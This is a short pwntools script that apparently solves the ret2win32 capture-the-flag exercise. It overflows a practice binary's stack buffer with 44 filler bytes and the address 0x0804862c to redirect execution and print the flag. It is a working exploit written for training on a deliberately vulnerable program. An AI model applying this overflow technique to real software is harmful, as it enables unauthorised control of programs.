#!/usr/bin/env python3

from pwn import *

ret2win_path="./ret2win32"
ret2win_addr="0x0804862c"

r2wp = process(ret2win_path)
buf = 44*b'\x41'+b'\x2c\x86\x04\x08'
print(r2wp.recvuntil(b'>').decode('utf-8'))

r2wp.sendline(buf)
print(r2wp.recvuntil(b'}').decode('utf-8'))
